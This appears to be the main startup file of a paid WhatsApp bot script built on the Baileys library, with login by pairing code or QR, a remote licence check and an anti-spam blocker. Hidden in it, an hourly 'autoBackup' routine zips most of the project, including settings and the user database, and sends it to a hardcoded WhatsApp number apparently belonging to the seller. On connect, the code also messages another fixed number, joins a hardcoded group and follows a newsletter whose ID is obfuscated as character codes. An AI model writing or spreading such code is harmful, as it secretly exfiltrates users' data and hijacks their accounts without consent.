require('../settings');
const fs = require('fs');
const pino = require('pino');
const path = require('path');
const chalk = require('chalk');
const axios = require("axios");
const readline = require('readline');
const FileType = require('file-type');
const { exec, execSync } = require('child_process');
const { Boom } = require('@hapi/boom');
const { say } = require('cfonts');
const fetch = require("node-fetch");
const qrcode = require('qrcode-terminal');

const {
  default: WAConnection,
  useMultiFileAuthState,
  DisconnectReason,
  makeInMemoryStore,
  fetchLatestWaWebVersion,
  proto,
} = require('@whiskeysockets/baileys');

const pairingCode = true;
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (text) => new Promise((resolve) => rl.question(text, resolve));

const DataBase = require('./data1');
const { MessagesUpsert, Solving } = require('./data2');
const { sleep } = require('./data3');
const { welcomeBanner, promoteBanner } = require("./data4");

const database = new DataBase();
(async () => {
  const loadData = await database.read();
  if (!loadData || Object.keys(loadData).length === 0) {
    global.db = { users: {}, groups: {}, database: {}, settings: {} };
    await database.write(global.db);
  } else {
    global.db = loadData;
  }
  setInterval(async () => {
    if (global.db) await database.write(global.db);
  }, 3500);
})();

async function fetchJsonMulti(url, timeout = 10000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);
  try {
    const response = await fetch(url, { signal: controller.signal });
    if (!response.ok) throw new Error(`HTTP error ${response.status}`);
    return await response.json();
  } finally {
    clearTimeout(timer);
  }
}

async function safeSendMessage(FR3, jid, content, timeout = 15000, retries = 3) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      return await Promise.race([
        FR3.sendMessage(jid, content),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timed Out')), timeout))
      ]);
    } catch (err) {
      console.log(chalk.redBright(`[!] Gagal kirim pesan (percobaan ${attempt}): ${err.message}`));
      if (attempt === retries) throw err;
      await sleep(2000);
    }
  }
}

async function autoClean(FR3) {
  try {
    const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json");
    const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A");

    dirsesi.forEach(file => fs.unlinkSync(path.join("./session", file)));
    dirsampah.forEach(file => fs.unlinkSync(path.join("./library/database/sampah", file)));

    const report = `*Berhasil membersihkan sampah perjam ✅*\n*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`;
    console.log(chalk.greenBright('[*] ' + report));

    if (FR3) {
      await safeSendMessage(FR3, "62882008771871@s.whatsapp.net", { text: report });
    }
  } catch (err) {
    console.log(chalk.redBright('[!] Gagal membersihkan sampah:', err));
  }
}

async function autoBackup(FR3) {
  try {
    const ls = execSync("ls")
      .toString()
      .split("\n")
      .filter(
        (pe) =>
          pe !== "node_modules" &&
          pe !== "session" &&
          pe !== "package-lock.json" &&
          pe !== "yarn.lock" &&
          pe !== ""
      );

    execSync(`zip -r Backup.zip ${ls.join(" ")}`);

    const target = "62882008771871@s.whatsapp.net";
    await safeSendMessage(FR3, target, {
      document: fs.readFileSync("./Backup.zip"),
      mimetype: "application/zip",
      fileName: "Backup.zip",
      caption: "SUKSES MELAKUKAN BACKUP PER JAM"
    });

    execSync("rm -rf Backup.zip");

    console.log(chalk.greenBright("[*] Backup dan pengiriman selesai!"));
  } catch (err) {
    console.log(chalk.redBright("[!] Gagal melakukan backup:", err));
  }
}

async function startingBot() {
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent' }) });
  const { state, saveCreds } = await useMultiFileAuthState('session');

  const FR3 = WAConnection({
    browser: ['Ubuntu', 'Safari', '18.1'],
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    generateHighQualityLinkPreview: true,
    getMessage: async (key) => ({ conversation: 'WhatsApp Bot By Nvidia Botz' })
  });

  if (!FR3.authState.creds.registered) {
    console.clear();
    const numb = await question(chalk.blue('MASUKAN NOMOR: \n'));
    const { data } = await axios.get("https://web-db-two.vercel.app/raw");
    let user;
    try {
      user = data.find(i => i.number == numb);
    } catch (err) {
      console.log("Error gagal mengambil database: " + err);
      return process.exit(1);
    }
    if (!user) {
      console.log(chalk.blue(`Akses ditolak!\nnomor tidak terdaftar di dalam database`));
      return process.exit(1);
    }
    if (user.status !== "active") {
      console.log(chalk.blue(`Akses ditolak!\nnomor telah di blacklist dari database`));
      return process.exit(1);
    }

    say('FR3XD', {
      font: 'block',
      align: 'center',
      colors: ['red', 'yellow'],
    });

    console.log(chalk.cyanBright(`
╭────────────『 *METODE LOGIN* 』─────────────────────────
│ 
│    TERIMAKASIH SUDAH MEMBELI SCRIPT INI SEMOGA KAMU SENANG YA
│
│    Silakan pilih metode login yang ingin kamu gunakan:
│   1. Login dengan Pairing Code
│   2. Login dengan QR Code
│   3. Login dengan Pairing Code Custom
│
╰─────────────────────────────────────────────────────────
    `));

    const metode = await question(chalk.magentaBright('PILIH METODE: \n'));

    if (metode === '1') {
      const pertanyaannumber = await question(chalk.cyan.bold('Masukkan Nomor Bot:\n'));
      console.log("Proses Mengirim Pairing Code!!");
      await sleep(1500);
      const customPairingCode = global.custompairing || "QWERTYUI";
      const code = await FR3.requestPairingCode(pertanyaannumber.trim(), customPairingCode);
      console.log(chalk.white.bold('╭─▸ Code Pairing Kamu'));
      console.log(chalk.green.bold(`│   ${code}`));
      console.log(chalk.white.bold('╰────────────˧'));
    } else if (metode === '2') {
      console.log(chalk.yellowBright('[!] Menunggu QR Code muncul...'));
      FR3.ev.on('connection.update', async (update) => {
        if (update.qr) {
          console.clear();
          say('FR3 \n DEV', {
            font: 'block',
            align: 'center',
            colors: ['red', 'yellow'],
          });
          console.log(chalk.yellowBright('[!] Silakan scan QR Code yang muncul di bawah ini...'));
          qrcode.generate(update.qr, { small: true });
        }
      });
    } else if (metode === '3') {
      const pertanyaannumber = await question(chalk.cyan.bold('Masukkan Nomor Bot:\n'));
      let customPairingCode;

      while (true) {
        customPairingCode = await question(chalk.cyan.bold('Masukkan Pairing Code Custom (8 karakter):\n'));
        if (customPairingCode.trim().length === 8) {
          break;
        } else {
          console.log(chalk.redBright(`Pairing code harus tepat 8 karakter!\nContoh Pairing Code: QWERTYUI`));
        }
      }

      console.log("Proses Mengirim Pairing Code Custom!!");
      await sleep(1500);
      const code = await FR3.requestPairingCode(pertanyaannumber.trim(), customPairingCode.trim());
      console.log(chalk.white.bold('╭─▸ Code Pairing Kamu (Custom)'));
      console.log(chalk.green.bold(`│   ${code}`));
      console.log(chalk.white.bold('╰────────────˧'));
    } else {
      console.log(chalk.redBright('Input tidak valid! Keluar...'));
      process.exit(1);
    }
  }

  FR3.ev.on('creds.update', saveCreds);

  FR3.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    console.log(chalk.yellowBright('[i] Connection Update:'), connection);

    if (connection === 'close') {
      const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
      console.log(chalk.redBright(`[!] Koneksi ditutup. Alasan: ${reason}`));

      if ([DisconnectReason.connectionLost, DisconnectReason.connectionClosed, DisconnectReason.restartRequired, DisconnectReason.timedOut].includes(reason)) {
        console.log('Reconnecting...');
        startingBot();
      } else if ([DisconnectReason.badSession, DisconnectReason.connectionReplaced, DisconnectReason.loggedOut, DisconnectReason.Multidevicemismatch].includes(reason)) {
        exec('rm -rf ./session/*');
        process.exit(1);
      } else {
        FR3.end(`Unknown DisconnectReason: ${reason}`);
      }
    }

  if (connection === 'open') {
  console.clear();
  say('NVIDIA', {
    font: 'block',
    align: 'center',
    colors: ['green', 'cyan'],
    background: 'transparent',
    letterSpacing: 1,
    lineHeight: 1,
    space: true,
    maxLength: '0'
  });

  try {
    await safeSendMessage(FR3, "62882008397736@s.whatsapp.net", {
      text: `*[ ! ] NvidiaBotz*\n\nDon't forget to subscribe to the channel developer -> https://youtube.com/@fr3_hosting?si=SmavOlmHNixSkKnx`
    });
  } catch (err) {
    console.log(chalk.redBright(`[!] Gagal kirim pesan awal: ${err.message}`));
  }

  try {
    FR3.newsletterFollow("49, 50, 48, 51, 54, 51, 52, 49, 56, 57, 53, 49, 49, 55, 55, 53, 48, 52, 64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114");
    const text = 'https://chat.whatsapp.com/H2q7CafuYkl1bMzzNYQlO1';
    const result = text.split('https://chat.whatsapp.com/')[1];
    FR3.groupAcceptInvite(result);
  } catch {}

  console.log(chalk.magenta.italic("NvidiaBotz Connected ✓\n\n"));

  autoClean(FR3);
  setInterval(() => autoClean(FR3), 60 * 60 * 1000);

  autoBackup(FR3);
  setInterval(() => autoBackup(FR3), 60 * 60 * 1000);

  await Solving(FR3, store);
}
  });

  store.bind(FR3.ev);

  FR3.ev.on('messages.upsert', async (message) => {
    try {
      const msg = message.messages[0];
      if (!msg.message || !msg.key.remoteJid) return;

      const jid = msg.key.remoteJid;
      const senderNumber = jid.split("@")[0];

      if (msg.message?.conversation && msg.message.conversation.length > 999) {
        const warningText = `- TERDETEKSI ANDA MENGEBUG BOT NVIDIA. MAAF SAYA BLOK ANDA -`;
        await FR3.sendMessage(jid, { text: warningText });

        await FR3.updateBlockStatus(jid, "block");

        if (global.db.users && global.db.users[jid]) {
          delete global.db.users[jid];
        }

        const adminJid = "62882008771871@s.whatsapp.net";
        const reportText = `TERDETEKSI ADA YANG BUG\n\nNomor: ${senderNumber}`;
        await FR3.sendMessage(adminJid, { text: reportText });

        console.log(chalk.redBright(`[ANTI BUG] Pesan panjang dari ${jid} diblokir dan dihapus.`));
        return;
      }

      await MessagesUpsert(FR3, message, store);
    } catch (err) {
      console.log(chalk.red('[!] Error saat proses pesan:'), err);
    }
  });

  FR3.ev.on('contacts.update', (update) => {
    for (let contact of update) {
      let id = FR3.decodeJid(contact.id);
      if (store.contacts) store.contacts[id] = { id, name: contact.notify };
    }
  });
}

async function startWithRetry(retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      await startingBot();
      break;
    } catch (err) {
      console.log(chalk.redBright(`[!] Gagal start bot (percobaan ${i + 1}): ${err.message}`));
      if (i < retries - 1) await sleep(3000);
    }
  }
}

startWithRetry();

process.on('uncaughtException', function (err) {
  console.log('Caught exception: ', err);
});

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}\n ©FR3 DEV`));
  delete require.cache[file];
  require(file);
});